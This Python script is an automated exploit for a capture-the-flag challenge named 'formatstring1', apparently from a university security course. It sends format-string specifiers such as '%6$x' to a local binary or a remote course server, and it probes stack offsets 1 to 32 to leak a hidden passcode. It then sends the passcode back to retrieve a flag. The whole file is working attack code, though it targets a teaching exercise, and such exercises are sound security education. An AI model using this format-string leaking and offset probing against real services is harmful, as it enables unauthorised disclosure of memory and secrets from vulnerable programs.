#!/usr/bin/env python3
"""
formatstring1 remote solver

This script automates the exact manual attack:
1) Connect to remote service.
2) Send "%6$x" to leak passcode from stack.
3) Send leaked passcode back at second prompt.
4) Print all server output (including flag on success).
"""

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import subprocess
import time
from pathlib import Path
from typing import Optional


SCRIPT_DIR = Path(__file__).resolve().parent
FORMATSTRING_DIR = SCRIPT_DIR.parent / "formatstring1"
DEFAULT_BINARY = str(FORMATSTRING_DIR / "random-game")
DEFAULT_HOST = "moa6.eecs.utk.edu"
DEFAULT_PORT = 32100
DEFAULT_LEAK_FORMAT = "auto"

HEX_RE = re.compile(r"0x[0-9a-fA-F]+|\b[0-9a-fA-F]{4,}\b")
FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)
GENERIC_FLAG_RE = re.compile(r"\b[a-z][a-z0-9_-]{1,32}\{[^}\n]{4,128}\}", re.IGNORECASE)
READY_TIMEOUT = 4.0
IDLE_TIMEOUT = 0.25


def _read_local_idle(
    proc: subprocess.Popen[bytes], timeout: float = READY_TIMEOUT
) -> str:
    if proc.stdout is None:
        raise RuntimeError("Failed to open subprocess stdout")
    out = b""
    fd = proc.stdout.fileno()
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
        if not ready:
            if out:
                break
            continue
        chunk = os.read(fd, 4096)
        if not chunk:
            break
        out += chunk
    return out.decode(errors="replace")


def _read_remote_idle(sock: socket.socket, timeout: float = READY_TIMEOUT) -> str:
    out = b""
    deadline = time.monotonic() + timeout
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(min(IDLE_TIMEOUT, remaining))
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            if out:
                break
            continue
        if not chunk:
            break
        out += chunk
    return out.decode(errors="replace")


def first_nonempty_line(text: str) -> Optional[str]:
    """Return the first non-empty line from a text block."""
    for line in text.splitlines():
        stripped = line.strip()
        if stripped:
            return stripped
    return None


def first_hex_token(text: str) -> Optional[str]:
    for line in text.splitlines():
        for match in HEX_RE.finditer(line):
            token = match.group(0).strip()
            if token:
                return token
    return None


def build_leak_payload(leak_format: str) -> bytes:
    if not leak_format.endswith("\n"):
        leak_format += "\n"
    return leak_format.encode()


def looks_like_success(text: str) -> bool:
    return bool(FLAG_RE.search(text) or GENERIC_FLAG_RE.search(text))


def _run_local_once(binary: str, leak_format: str) -> str:
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=str(FORMATSTRING_DIR),
    )

    if proc.stdin is None or proc.stdout is None:
        raise RuntimeError("Failed to open subprocess pipes")

    banner = _read_local_idle(proc)
    proc.stdin.write(build_leak_payload(leak_format))
    proc.stdin.flush()
    stage_two = _read_local_idle(proc)

    leaked = first_hex_token(stage_two) or first_nonempty_line(stage_two)
    if leaked is None:
        raise RuntimeError("Failed to parse leaked passcode from local output")

    proc.stdin.write((leaked + "\n").encode())
    proc.stdin.flush()
    proc.stdin.close()

    rest = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()

    return banner + stage_two + rest


def run_local(binary: str, leak_format: str) -> None:
    if leak_format != "auto":
        print(_run_local_once(binary, leak_format), end="")
        return

    for idx in range(1, 33):
        candidate = f"%{idx}$x"
        output = _run_local_once(binary, candidate)
        print(f"[*] try leak-format={candidate}")
        if looks_like_success(output):
            print(output, end="")
            return
    raise RuntimeError("auto mode failed to find working leak offset")


def _run_remote_once(host: str, port: int, leak_format: str) -> str:
    with socket.create_connection((host, port), timeout=5.0) as sock:
        banner = _read_remote_idle(sock)
        sock.sendall(build_leak_payload(leak_format))
        stage_two = _read_remote_idle(sock)
        leaked = first_hex_token(stage_two) or first_nonempty_line(stage_two)
        if leaked is None:
            raise RuntimeError("Failed to parse leaked passcode from server response")

        sock.sendall((leaked + "\n").encode())
        tail = _read_remote_idle(sock, timeout=5.0)
        return banner + stage_two + tail


def run_remote(host: str, port: int, leak_format: str) -> None:
    if leak_format != "auto":
        print(_run_remote_once(host, port, leak_format), end="")
        return

    for idx in range(1, 33):
        candidate = f"%{idx}$x"
        output = _run_remote_once(host, port, candidate)
        print(f"[*] try leak-format={candidate}")
        if looks_like_success(output):
            print(output, end="")
            return
    raise RuntimeError("auto mode failed to find working leak offset")


def main() -> None:
    parser = argparse.ArgumentParser(description="formatstring1 helper")
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="local",
        help="target mode (default: local)",
    )
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument(
        "--host", default=DEFAULT_HOST, help="remote host (used when --mode remote)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help="remote port (used when --mode remote)",
    )
    parser.add_argument(
        "--leak-format",
        default=DEFAULT_LEAK_FORMAT,
        help="leak format (default: auto, probes %%1$x..%%32$x)",
    )
    args = parser.parse_args()

    if args.mode == "local":
        run_local(args.binary, args.leak_format)
    else:
        run_remote(args.host, args.port, args.leak_format)


if __name__ == "__main__":
    main()
